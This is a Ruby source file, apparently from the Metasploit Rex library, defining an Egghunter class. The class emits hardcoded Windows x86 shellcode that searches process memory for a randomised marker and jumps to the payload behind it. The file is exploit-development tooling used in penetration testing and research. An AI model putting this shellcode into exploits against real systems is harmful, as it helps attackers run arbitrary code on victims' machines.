require 'rex/text'

module Rex
module Exploitation

###
#
# Egghunter
# ---------
#
# This class provides an interface to generating egghunters.
#
###
class Egghunter

	###
	#
	# Windows-based egghunters
	#
	###
	module Windows
		Alias = "win"

		module X86
			Alias = "x86"
		
			def hunter_stub
				{
					'Stub' => 
						"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02" +
						"\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8" +
						"\x41\x41\x41\x41" +
						"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7",
					'EggSize'   => 4,
					'EggOffset' => 0x12
				}
			end
	
		end
	end

	###
	#
	# Generic interface
	#
	###

	def initialize(platform, arch = nil)
		Egghunter.constants.each { |c|
			mod = self.class.const_get(c)

			next if ((!mod.kind_of?(::Module)) or 
			         (!mod.const_defined?('Alias')))

			if (platform =~ /#{mod.const_get('Alias')}/i)
				self.extend(mod)

				if (arch and mod)
					mod.constants.each { |a|
						amod = mod.const_get(a)

						next if ((!amod.kind_of?(::Module)) or 
						         (!amod.const_defined?('Alias')))

						if (arch =~ /#{mod.const_get(a).const_get('Alias')}/i)
							amod = mod.const_get(a)

							self.extend(amod)
						end
					}
				end
			end
		}
	end

	#
	# Generates an egghunter using the derived hunter stub.
	#
	def generate(badchars = '')
		return nil if ((opts = hunter_stub) == nil)

		stub  = opts['Stub'].dup
		esize = opts['EggSize']
		eoff  = opts['EggOffset']
		egg   = Rex::Text.rand_text(esize, badchars)

		stub[eoff, esize] = egg

		stub
	end

protected

	#
	# Stub method that is meant to be overridden.
	#
	def hunter_stub
	end

end

end
end
